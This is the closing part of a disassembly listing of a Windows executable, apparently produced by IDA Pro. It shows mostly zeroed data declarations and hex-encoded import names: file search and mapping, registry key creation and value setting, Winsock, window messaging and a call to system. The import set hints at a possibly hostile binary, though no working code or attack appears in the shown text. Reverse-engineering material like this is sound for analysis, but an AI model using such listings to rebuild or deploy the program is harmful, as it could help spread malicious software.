; [00000006 BYTES: COLLAPSED FUNCTION memcmp. PRESS KEYPAD "+" TO EXPAND]
		align 10h
dword_807F20	dd 0			; DATA XREF: sub_802E90+6w sub_802E9Cr ...
		align 8
dword_807F28	dd 0			; DATA XREF: sub_803E39:loc_803E49w
					; sub_803E39+1Cw ...
dword_807F2C	dd 0			; DATA XREF: sub_803E39+2Ew
					; sub_803E39+5Dw ...
byte_807F30	db 0			; DATA XREF: sub_803E39+99o
					; sub_803E39+10Er
byte_807F31	db 0			; DATA XREF: sub_803E39:loc_803F6Er
		dd 3Fh dup(0)
		align 10h
dword_808030	dd 0			; DATA XREF: sub_803E39+80w
		db 3 dup(0)
byte_808037	db 0			; DATA XREF: sub_803E39+F7r
byte_808038	db 0			; DATA XREF: sub_803E39+94o
					; sub_803E39:loc_803F27r
		dd 3Fh dup(0)
		align 4
dword_808138	dd 0			; DATA XREF: sub_804BB6:loc_804CBCr
					; sub_804BB6+122r ...
dword_80813C	dd 0			; DATA XREF: sub_8051BCr
					; sub_8051BC+42w ...
dword_808140	dd 40h dup(0)		; DATA XREF: sub_806CF9+8Fo
byte_808240	db 0			; DATA XREF: sub_806CF9+1Ar
					; sub_806CF9+6Bw
		align 4
dword_808244	dd 0			; DATA XREF: sub_807B94+14r
					; sub_807D81+14w
dword_808248	dd 0			; DATA XREF: sub_804BA1w sub_804BAC+4w ...
dword_80824C	dd 0			; DATA XREF: sub_80418A+31r
					; sub_80418A+B3r ...
; __int32 Addend
Addend		dd 0			; DATA XREF: sub_8044DC+2o
					; sub_8044DC:loc_804501r ...
dword_808254	dd 0			; DATA XREF: sub_80431F+1r sub_804349r ...
		dd 3 dup(0), 848Ch, 101Ch, 3 dup(0), 8499h, 1000h, 3 dup(0)
		dd 84A6h, 10F8h, 3 dup(0), 84B1h, 1150h, 3 dup(0), 84BCh
		dd 1170h, 74h dup(0), 4E52454Bh, 32334C45h, 4C4C442Eh
		dd 56444100h, 33495041h, 6C642E32h, 534D006Ch, 54524356h
		dd 6C6C642Eh, 45535500h, 2E323352h, 6C6C64h, 5F325357h
		dd 642E3233h, 6C6Ch, 65470000h,	6D655474h, 6C694670h, 6D614E65h
		dd 4165h, 74697257h, 6C694665h,	65h, 53746547h,	65747379h
		dd 6D69546Dh, 65h, 43746547h, 65727275h, 6854746Eh, 64616572h
		dd 65530000h, 72685474h, 50646165h, 726F6972h, 797469h
		dd 65470000h, 69724474h, 79546576h, 416570h, 6C470000h
		dd 6C61626Fh, 6F6C6C41h, 63h, 646E6946h, 73726946h, 6C694674h
		dd 4165h, 646E6946h, 7478654Eh,	656C6946h, 41h,	646E6946h
		dd 736F6C43h, 65h, 46746547h, 53656C69h, 657A69h, 72430000h
		dd 65746165h, 656C6946h, 7070614Dh, 41676E69h, 614D0000h
		dd 65695670h, 46664F77h, 656C69h, 6E550000h, 5670616Dh
		dd 4F776569h, 6C694666h, 65h, 65746E49h, 636F6C72h, 4964656Bh
		dd 6572636Eh, 746E656Dh, 6E490000h, 6C726574h, 656B636Fh
		dd 63654464h, 656D6572h, 746Eh,	626F6C47h, 72466C61h, 6565h
		dd 45746553h, 664F646Eh, 656C6946h, 65470000h, 766E4574h
		dd 6E6F7269h, 746E656Dh, 69726156h, 656C6261h, 41h, 4C746547h
		dd 45747361h, 726F7272h, 72430000h, 65746165h, 6574754Dh
		dd 4178h, 46746547h, 41656C69h,	69727474h, 65747562h, 4173h
		dd 79706F43h, 656C6946h, 41h, 656C6544h, 69466574h, 41656Ch
		dd 6C430000h, 4865736Fh, 6C646E61h, 65h, 61657243h, 69466574h
		dd 41656Ch, 65530000h, 6C694674h, 74744165h, 75626972h
		dd 41736574h, 736C0000h, 656C7274h, 416Eh, 54746547h, 50706D65h
		dd 41687461h, 65470000h, 6E695774h, 73776F64h, 65726944h
		dd 726F7463h, 4179h, 7274736Ch,	41746163h, 736C0000h, 70637274h
		dd 4179h, 4D746547h, 6C75646Fh,	6C694665h, 6D614E65h, 4165h
		dd 74697845h, 65726854h, 6461h,	65656C53h, 70h,	61657243h
		dd 68546574h, 64616572h, 78450000h, 72507469h, 7365636Fh
		dd 73h,	54746547h, 5A656D69h, 49656E6Fh, 726F666Eh, 6974616Dh
		dd 6E6Fh, 656C6946h, 656D6954h,	79536F54h, 6D657473h, 656D6954h
		dd 69460000h, 6954656Ch, 6F54656Dh, 61636F4Ch, 6C69466Ch
		dd 6D695465h, 65h, 4C746547h, 6C61636Fh, 656D6954h, 65470000h
		dd 63695474h, 756F436Bh, 746Eh,	65646957h, 72616843h, 754D6F54h
		dd 4269746Ch, 657479h, 65470000h, 6F725074h, 64644163h
		dd 73736572h, 6F4C0000h, 694C6461h, 72617262h, 4179h, 4D746547h
		dd 6C75646Fh, 6E614865h, 41656C64h, 65520000h, 69466461h
		dd 656Ch, 46746553h, 50656C69h,	746E696Fh, 7265h, 7274736Ch
		dd 69706D63h, 41h, 50746547h, 65636F72h, 65487373h, 7061h
		dd 70616548h, 6F6C6C41h, 63h, 7274736Ch, 6E797063h, 41h
		dd 7274736Ch, 41706D63h, 65480000h, 72467061h, 6565h, 53676552h
		dd 61567465h, 4565756Ch, 4178h,	4F676552h, 4B6E6570h, 78457965h
		dd 41h,	43676552h, 74616572h, 79654B65h, 417845h, 65520000h
		dd 6F6C4367h, 654B6573h, 79h, 45676552h, 4B6D756Eh, 417965h
		dd 65520000h, 65755167h, 61567972h, 4565756Ch, 4178h, 736D656Dh
		dd 7465h, 6F6C6F74h, 726577h, 656D0000h, 7970636Dh, 73690000h
		dd 69676964h, 74h, 63727473h, 7268h, 6C617369h,	6D756Eh
		dd 73690000h, 63617073h, 65h, 6C727473h, 6E65h,	63727473h
		dd 7970h, 73727473h, 7274h, 6C6C616Dh, 636Fh, 63727473h
		dd 7461h, 6C616572h, 636F6Ch, 63660000h, 65736F6Ch, 72660000h
		dd 646165h, 6F660000h, 6E6570h,	69740000h, 656Dh, 69727766h
		dd 6574h, 74737973h, 6D65h, 636D656Dh, 706Dh, 65657266h
		dd 68430000h, 70557261h, 42726570h, 41666675h, 68430000h
		dd 70557261h, 41726570h, 68430000h, 6F4C7261h, 41726577h
		dd 76770000h, 69727073h, 4166746Eh, 73770000h, 6E697270h
		dd 416674h, 69460000h, 6957646Eh, 776F646Eh, 41h, 74736F50h
		dd 7373654Dh, 41656761h, 20h dup(0)
_text		ends


		end start
